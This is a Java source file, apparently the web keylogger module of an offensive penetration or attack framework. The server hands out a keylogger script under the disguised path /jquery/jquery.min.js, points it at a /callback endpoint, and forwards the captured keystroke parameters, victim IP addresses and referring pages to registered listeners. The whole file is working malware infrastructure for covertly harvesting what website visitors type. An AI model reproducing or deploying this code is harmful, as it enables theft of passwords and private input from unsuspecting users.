package cloudstrike;

import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import profiler.SystemProfiler;

public class Keylogger implements WebService {
    protected String content;

    public void addKeyloggerListener(KeyloggerListener l) {
        this.listeners.add(l);
    }

    protected String type;
    protected String desc;
    protected String proto;
    protected List listeners;

    public Keylogger(String content, String type, String desc) {
        this.proto = "";
        this.listeners = new LinkedList();
        this.content = content;
        this.type = type;
        this.desc = desc;
    }

    public void setup(WebServer w, String uri) {
        w.register(uri, this);
        w.registerSecondary("/callback", this);
        w.registerSecondary("/jquery/jquery.min.js", this);

        if (w.isSSL()) {
            this.proto = "https://";
        } else {
            this.proto = "http://";
        }
    }

    public boolean suppressEvent(String uri) {
        return "/callback".equals(uri);
    }


    public String resource(String resource, String url) {
        StringBuffer temp = new StringBuffer(524288);
        try {
            SystemProfiler.suckItDown(resource, temp);
        } catch (Exception ex) {
            WebServer.logException("Could not get resource: " + resource, ex, false);
        }
        return temp.toString().replace("%URL%", url);
    }

    public Response serve(String uri, String method, Properties header, Properties param) {
        if (uri.equals("/jquery/jquery.min.js")) {
            return new Response("200 OK", "text/javascript", resource("/resources/keylogger.js", this.proto + header.get("Host") + "/callback"));
        }
        if (uri.equals("/callback")) {
            Iterator i = this.listeners.iterator();
            String who = header.get("REMOTE_ADDRESS") + "";
            String from = header.get("Referer") + "";

            if (who.length() > 1) {
                who = who.substring(1);
            }
            KeyloggerListener l = null;
            while (i.hasNext()) {
                try {
                    l = (KeyloggerListener) i.next();
                    l.slowlyStrokeMe(from, who, param, param.get("id") + "");
                } catch (Exception ex) {
                    WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, ex, false);
                }
            }
            return new Response("200 OK", "text/plain", "");
        }
        return new Response("200 OK", this.type, this.content.replace("%TOKEN%", param.get("id") + ""));
    }


    public String toString() {
        return this.desc;
    }


    public String getType() {
        return "page";
    }


    public List cleanupJobs() {
        return new LinkedList();
    }


    public boolean isFuzzy() {
        return false;
    }

    public static interface KeyloggerListener {
        void slowlyStrokeMe(String string1, String string2, Map map, String string3);
    }
}
